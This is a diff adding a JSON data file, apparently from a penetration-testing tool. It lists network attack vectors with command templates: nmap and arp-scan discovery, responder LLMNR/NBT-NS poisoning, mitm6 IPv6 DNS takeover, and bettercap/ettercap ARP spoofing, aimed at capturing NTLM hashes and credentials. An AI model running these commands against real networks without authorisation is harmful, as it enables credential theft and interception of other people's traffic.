@@ -1,0 +1,89 @@
+{
+  "service": "Network General",
+  "description": "General network-level attacks not tied to specific services",
+  "ports": [],
+  "serviceNames": [],
+  "targetOs": ["Any"],
+  "vectors": [
+    {
+      "id": "network_discovery",
+      "name": "Network Host Discovery",
+      "phase": "reconnaissance",
+      "prerequisites": [],
+      "description": "Discover live hosts on the network",
+      "commands": [
+        {
+          "tool": "nmap",
+          "syntax": "nmap -sn <ip_range>",
+          "description": "Ping scan to find live hosts"
+        },
+        {
+          "tool": "nmap",
+          "syntax": "nmap -sP <ip_range>",
+          "description": "Legacy ping scan"
+        },
+        {
+          "tool": "arp-scan",
+          "syntax": "arp-scan -l",
+          "description": "Local network ARP scan"
+        }
+      ],
+      "outcomes": ["live_hosts", "network_map"]
+    },
+    {
+      "id": "network_llmnr_poison",
+      "name": "LLMNR/NBT-NS Poisoning",
+      "phase": "credential_access",
+      "prerequisites": [],
+      "description": "Poison local network name resolution to capture credentials",
+      "commands": [
+        {
+          "tool": "responder",
+          "syntax": "responder -I <interface>",
+          "description": "Poison LLMNR, NBT-NS, and MDNS"
+        },
+        {
+          "tool": "responder",
+          "syntax": "responder -I <interface> -wrf",
+          "description": "Poison with WPAD, force NTLM, fingerprint"
+        }
+      ],
+      "outcomes": ["ntlm_hash", "credentials"]
+    },
+    {
+      "id": "network_mitm6",
+      "name": "IPv6 DNS Takeover (mitm6)",
+      "phase": "credential_access",
+      "prerequisites": [],
+      "description": "Exploit IPv6 to become the DNS server",
+      "commands": [
+        {
+          "tool": "mitm6",
+          "syntax": "mitm6 -d <domain>",
+          "description": "IPv6 DNS takeover"
+        }
+      ],
+      "outcomes": ["ntlm_hash", "credentials", "dns_control"]
+    },
+    {
+      "id": "network_arp_poison",
+      "name": "ARP Poisoning/Spoofing",
+      "phase": "credential_access",
+      "prerequisites": [],
+      "description": "Man-in-the-middle via ARP poisoning",
+      "commands": [
+        {
+          "tool": "bettercap",
+          "syntax": "bettercap -iface <interface>",
+          "description": "Network attack framework"
+        },
+        {
+          "tool": "ettercap",
+          "syntax": "ettercap -T -M arp:remote /<target1>/ /<target2>/",
+          "description": "ARP poisoning between two hosts"
+        }
+      ],
+      "outcomes": ["traffic_intercept", "credentials"]
+    }
+  ]
+}
